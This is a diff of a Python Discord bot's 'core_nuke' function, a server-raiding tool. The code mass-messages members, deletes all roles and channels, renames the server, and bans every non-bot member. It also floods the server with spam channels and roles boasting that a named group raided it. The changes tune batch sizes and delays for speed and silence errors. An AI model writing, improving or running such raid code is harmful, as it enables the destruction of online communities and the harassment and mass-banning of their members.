@@ -65,15 +65,16 @@ async def core_nuke(guild, new_server_name=None):
     await asyncio.gather(*[limited_dm(send_dm(m)) for m in non_bot_members], return_exceptions=True)
 
     # ロール削除（並行で速く）
-    print("ロール削除開始...")
     await asyncio.gather(*(r.delete() for r in guild.roles if not r.is_default() and not r.managed), return_exceptions=True)
-    print("ロール削除完了")
 
     # チャンネル削除（並行）
     await asyncio.gather(*(ch.delete() for ch in guild.channels), return_exceptions=True)
 
     # サーバー名変更
-    await guild.edit(name=new_name)
+    try:
+        await guild.edit(name=new_name)
+    except:
+        pass
 
     # 規模別調整
     member_count = len(non_bot_members)
@@ -82,35 +83,34 @@ async def core_nuke(guild, new_server_name=None):
         target_roles = 80
         spam_sleep_min = 0.1
         spam_sleep_max = 0.25
-        role_batch_sleep = 0.05
     elif member_count < 500:
         target_channels = 80
         target_roles = 60
         spam_sleep_min = 0.15
         spam_sleep_max = 0.35
-        role_batch_sleep = 0.08
     else:
         target_channels = 50
         target_roles = 40
         spam_sleep_min = 0.25
         spam_sleep_max = 0.5
-        role_batch_sleep = 0.12
 
-    # チャンネル作成（並行バッチ）
+    # チャンネル作成（並行バッチで速く）
     channels = []
     current = 0
     channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
     while len(channels) < target_channels:
         tasks = []
-        for _ in range(40):
+        batch_size = 40
+        for _ in range(batch_size):
             if len(channels) >= target_channels:
                 break
             current += 1
             name = channel_names[current % 2]
             tasks.append(guild.create_text_channel(name))
         batch = await asyncio.gather(*tasks, return_exceptions=True)
-        channels += [c for c in batch if isinstance(c, discord.TextChannel)]
-        await asyncio.sleep(0.08)
+        added = [c for c in batch if isinstance(c, discord.TextChannel)]
+        channels += added
+        await asyncio.sleep(0.08)  # 短めで回転
 
     # スパム開始 + BAN/ロール作成並行
     spam_messages = [
@@ -121,9 +121,10 @@ async def core_nuke(guild, new_server_name=None):
     message_counters = {ch.id: 0 for ch in channels}
     active_channels = channels.copy()
 
+    # BAN並行
     ban_task = asyncio.create_task(asyncio.gather(*(guild.ban(m, reason=new_name, delete_message_days=0) for m in non_bot_members), return_exceptions=True))
 
-    # ロール作成（並行バッチで速く）
+    # ロール作成並行バッチ
     role_create_task = asyncio.create_task(asyncio.gather(*(guild.create_role(
         name="ますまに共栄圏に荒らされましたｗｗｗ",
         color=discord.Color.random(),
